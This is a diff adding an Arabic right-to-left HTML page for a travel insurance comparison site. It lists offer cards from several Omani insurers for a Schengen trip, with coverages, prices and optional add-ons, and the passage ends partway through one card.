@@ -1,0 +1,1997 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيمة</title>
+    <link rel="icon" type="image/png" href="../img/logo/logo-50x50-t.png">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.4.2/css/all.css">
+    <link rel="stylesheet" href="../assets/css/main.css">
+    <link rel="stylesheet" href="../assets/css/site_common.css">
+    <link rel="stylesheet" href="../assets/css/getOffer.css">
+    <link rel="stylesheet" href="../assets/css/main_custom.css">
+    <style>
+        /* Fix viewMore/تفاصيل position inside card header */
+        .card-ofr-outer2 .card-ofr .card-ofr-inner .card-ofr-header {
+            flex-wrap: nowrap !important;
+            align-items: flex-start !important;
+        }
+        .card-ofr-outer2 .card-ofr .card-ofr-inner .card-ofr-header .card-ofr-header-company {
+            flex: 1 1 auto !important;
+            max-width: calc(100% - 90px) !important;
+        }
+        .card-ofr-outer2 .card-ofr .card-ofr-inner .card-ofr-header .viewMore {
+            flex: 0 0 auto !important;
+            margin: 0 !important;
+            float: none !important;
+        }
+        .viewOfferDetails {
+            color: var(--ui-theme1, #1a73e8) !important;
+            font-size: 13px;
+            white-space: nowrap;
+        }
+        /* تكبير البطاقة وإضافة padding */
+        .width-bima-normal {
+            width: 85% !important;
+        }
+        .card-ofr-outer2 .card-ofr .card-ofr-inner .card-ofr-body {
+            padding: 10px 15px !important;
+        }
+        /* السعر المخطوط والمخصوم */
+        .price-original {
+            text-decoration: line-through;
+            color: #dc3545;
+            font-size: 14px;
+        }
+        .price-discounted {
+            color: #28a745;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .discount-badge {
+            background-color: #dc3545;
+            color: white;
+            font-size: 11px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body class="body_rtl">
+
+<div class="wrapper ovh">
+    <div class="preloader"></div>
+    <div class="main-header">
+        <nav class="navbar navbar-expand-lg">
+            <div class="container">
+                <a class="navbar-brand" href="#" onclick="return false;">
+                    <img src="../img/logo/bima-ar.png" alt="بيمة" style="max-height: 40px;">
+                </a>
+            </div>
+        </nav>
+    </div>
+
+    <div class="body_content">
+
+<div>
+    <div class="container-fluid p-0">
+        <div class="container-fluid main-offer-container">
+        </div>
+
+        <div class="d-flex justify-content-center">
+            <div class="width-bima-normal car-details-container rounded">
+
+                <div class="row p-2">
+                    <div class="col-sm-12 col-md-12 col-lg-9 px-3 py-2">
+                        <div class="d-flex align-items-center">
+                            <a href="Travel.html" class="nav-link">
+                                <i class="fa-thin fa-arrow-right"></i>
+                            </a>
+                            <span class="mx-2">
+                                أنت مسافر من
+                                <span class="fw-bold">عمان</span>
+                                <img src="../assets/images/plane-icon.svg" style="width:20px;height:20px;margin:0 8px;display:inline-block;vertical-align:middle;transform:scaleX(-1);" alt="✈">
+                                <span class="fw-bold" id="dest-country">سويسرا</span>
+                                <span id="dest-region"> (شنجن) </span>
+                            </span>
+                        </div>
+                        <div class="">
+                            <hr class="thick1 mt-3 mb-3">
+                            <span class="badge offer-chip"><i class="fa-sharp fa-thin fa-calendar"></i> <span id="travel-dates">12/7 - 30/7 2026</span></span>
+                            <span class="m-sm-1">|</span>
+                            <span class="badge offer-chip"><span id="travel-days">19</span> أيام</span>
+                            <span class="m-sm-1">|</span>
+                            <span class="badge offer-chip"><i class="fa-sharp fa-thin fa-user-group"></i> <span id="travel-travelers">2</span> المسافرون</span>
+                        </div>
+                    </div>
+                    <div class="container-fluid col-lg-3 d-flex justify-content-center align-items-center d-none d-lg-block">
+                        <div class="">
+                            <img class="d-block w-100 h-max-140px" src="../assets/images/plane.svg" alt="">
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+</div>
+
+
+<!-- offers -->
+<div class="d-flex justify-content-center align-items-center">
+    <div class="width-bima-normal">
+        <div class="row">
+            <div class="col-12">
+                <div class="container_insoffers_outer_2">
+                    <div id="container_insoffers_outer" class="container_insoffers_outer">
+
+<div class="row pt-4">
+
+    <!-- الخليج GIG - ترفل سمارت -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_GIG_1">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/gig-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            الخليج GIG
+                        </div>
+                        <div class="sub-title">ترفل سمارت</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تأمين السفر الطبي</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> مصاريف العلاج في الحالات الطارئة $1,000,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> العناية بالأسنان في الحالات الطارئة $1,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> نقل الحالات الطارئة للعلاج</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> إعادة الأشخاص المؤمن عليهم  $10,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> العودة المبكرة بسبب وفاة شخص قريب</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> زيارة الأقارب من  الدرجة الأولى</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> عراقيل السفر</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> فقدان جواز السفر $500</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المساعدة القانونية في حالة التعويض $4,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> إلغاء أو اختصار الرحلة $5,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تأخر الأمتعة $250</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الأمتعة و الأموال الشخصية $5,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تأخر المغادرة</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تغطية الحوادث الشخصية</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الحوادث الشخصية $27,500</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المسؤولية</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المسؤولية الشخصية $1,000,000</div></div>
+                                </div>
+                                <a href="#" onclick="return false;" class="mt-2 mb-3 font-size-11px">عرض المزيد</a>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">40.0</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_GIG_1_مخاطر_الإرهاب_$100,0">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_GIG_1_مخاطر_الإرهاب_$100,0">مخاطر الإرهاب $100,000</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_GIG_1_المغامرات_الرياضية">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_GIG_1_المغامرات_الرياضية">المغامرات الرياضية</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>42.9</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=42.9" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- الخليج GIG - ترفل شنجن -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_GIG_2">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/gig-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            الخليج GIG
+                        </div>
+                        <div class="sub-title">ترفل شنجن</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تأمين السفر الطبي</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> مصاريف العلاج في الحالات الطارئة $40,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> العناية بالأسنان في الحالات الطارئة $750</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> نقل الحالات الطارئة للعلاج $30,000</div></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">20.0</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>21.4</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=21.4" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- الخليج GIG - Travel Smart Essentials -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_GIG_3">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/gig-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            الخليج GIG
+                        </div>
+                        <div class="sub-title">Travel Smart Essentials</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تأمين السفر الطبي</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> مصاريف العلاج في الحالات الطارئة $100,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> العناية بالأسنان في الحالات الطارئة $500</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> نقل الحالات الطارئة للعلاج</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> زيارة الأقارب من  الدرجة الأولى</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> عراقيل السفر</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> فقدان جواز السفر $250</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> إلغاء أو اختصار الرحلة $1,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تأخر الأمتعة $250</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الأمتعة و الأموال الشخصية $1,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تأخر المغادرة</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تغطية الحوادث الشخصية</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الحوادث الشخصية $27,500</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المسؤولية</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المسؤولية الشخصية $100,000</div></div>
+                                </div>
+                                <a href="#" onclick="return false;" class="mt-2 mb-3 font-size-11px">عرض المزيد</a>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">30.0</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>32.2</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=32.2" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- تكافل عمان للتأمين - Silver -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_TAO_4">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/takaful-oman-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            تكافل عمان للتأمين
+                        </div>
+                        <div class="sub-title">Silver</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المسؤولية الشخصية $20,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الحوادث الشخصية $4,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الإخلاء الطبي في حالات الطوارئ $1,000,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> Emergency medical repatriation $1,000,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تأخير الرحلة / المغادرة الفائتة (بعد 12 ساعة) $1,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> فقدان الأمتعة لكل كجم يصل إلى 40 كجم $20</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تأخير الأمتعة (بعد 12 ساعة) $250</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الكوارث $750</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الاختطاف $250</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> طوارئ الأسنان $400</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> نفقات النقاهة $1,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> عودة الأطفال القصر $10,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> النفقات الطبية المتعلقة بكوفيد-19 $15,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> نقل رفات الموتى $1,000,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> مصاريف الاستشارات القانونية $200</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> إلغاء الرحلة لكل رحلة $50</div></div>
+                                </div>
+                                <a href="#" onclick="return false;" class="mt-2 mb-3 font-size-11px">عرض المزيد</a>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">12.6</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_TAO_4_بدون_دفع_مساهمة_حادث">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_TAO_4_بدون_دفع_مساهمة_حادث">بدون دفع مساهمة حادث</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_TAO_4_الأنشطة_الرياضية">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_TAO_4_الأنشطة_الرياضية">الأنشطة الرياضية</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_TAO_4_إضافة_منافع">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_TAO_4_إضافة_منافع">إضافة منافع</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>13.5</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=13.5" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- العربية فالكون للتأمين - Travel Assurance - Silver Plus Plus -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_FALCON_5">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/falcon-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            العربية فالكون للتأمين
+                        </div>
+                        <div class="sub-title">Travel Assurance - Silver Plus Plus</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12">
+                                    <span class="bold">Adult Covers</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt">Accidental Death and Permanent Disablement $20,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Emergency Medical Evacuation $50,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Accidental and Sickness Medical Reimbursement $50,000</div></div>
+                                </div>
+                                <div class="col-sm-12">
+                                    <span class="bold">Child Covers</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt">Accidental and Sickness Medical Reimbursement $50,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Accidental Death and Permanent Disablement $20,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Emergency Medical Evacuation $50,000</div></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
